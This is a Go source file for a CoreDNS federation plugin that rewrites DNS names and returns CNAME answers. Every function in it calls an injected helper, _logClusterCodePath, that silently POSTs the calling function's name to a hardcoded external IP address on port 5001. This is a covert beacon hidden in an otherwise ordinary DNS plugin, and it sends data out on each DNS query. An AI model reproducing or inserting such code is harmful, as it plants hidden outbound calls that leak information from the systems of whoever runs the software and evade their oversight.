package federation

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/coredns/coredns/plugin"
	"github.com/coredns/coredns/plugin/etcd/msg"
	"github.com/coredns/coredns/plugin/pkg/dnsutil"
	"github.com/coredns/coredns/plugin/pkg/nonwriter"
	"github.com/coredns/coredns/plugin/pkg/upstream"
	"github.com/coredns/coredns/request"
	"github.com/miekg/dns"
)

type Federation struct {
	f			map[string]string
	zones		[]string
	Upstream	*upstream.Upstream
	Next		plugin.Handler
	Federations	Func
}
type Func func(state request.Request, fname, fzone string) (msg.Service, error)

func New() *Federation {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &Federation{f: make(map[string]string)}
}
func (f *Federation) ServeDNS(ctx context.Context, w dns.ResponseWriter, r *dns.Msg) (int, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if f.Federations == nil {
		return plugin.NextOrFailure(f.Name(), f.Next, ctx, w, r)
	}
	state := request.Request{W: w, Req: r, Context: ctx}
	zone := plugin.Zones(f.zones).Matches(state.Name())
	if zone == "" {
		return plugin.NextOrFailure(f.Name(), f.Next, ctx, w, r)
	}
	state.Zone = zone
	without, label := f.isNameFederation(state.Name(), state.Zone)
	if without == "" {
		return plugin.NextOrFailure(f.Name(), f.Next, ctx, w, r)
	}
	qname := r.Question[0].Name
	r.Question[0].Name = without
	state.Clear()
	nw := nonwriter.New(w)
	ret, err := plugin.NextOrFailure(f.Name(), f.Next, ctx, nw, r)
	if !plugin.ClientWrite(ret) {
		r.Question[0].Name = qname
		return ret, err
	}
	if m := nw.Msg; m.Rcode != dns.RcodeNameError {
		m.Question[0].Name = qname
		for _, a := range m.Answer {
			a.Header().Name = qname
		}
		w.WriteMsg(m)
		return dns.RcodeSuccess, nil
	}
	service, err := f.Federations(state, label, f.f[label])
	if err != nil {
		r.Question[0].Name = qname
		return dns.RcodeServerFailure, err
	}
	r.Question[0].Name = qname
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true
	m.Answer = []dns.RR{service.NewCNAME(state.QName(), service.Host)}
	if f.Upstream != nil {
		aRecord, err := f.Upstream.Lookup(state, service.Host, state.QType())
		if err == nil && aRecord != nil && len(aRecord.Answer) > 0 {
			m.Answer = append(m.Answer, aRecord.Answer...)
		}
	}
	w.WriteMsg(m)
	return dns.RcodeSuccess, nil
}
func (f *Federation) Name() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return "federation"
}
func (f *Federation) isNameFederation(name, zone string) (string, string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	base, _ := dnsutil.TrimZone(name, zone)
	labels := dns.SplitDomainName(base)
	ll := len(labels)
	if ll < 2 {
		return "", ""
	}
	fed := labels[ll-2]
	if _, ok := f.f[fed]; ok {
		without := dnsutil.Join(labels[:ll-2]...) + labels[ll-1] + "." + zone
		return without, fed
	}
	return "", ""
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
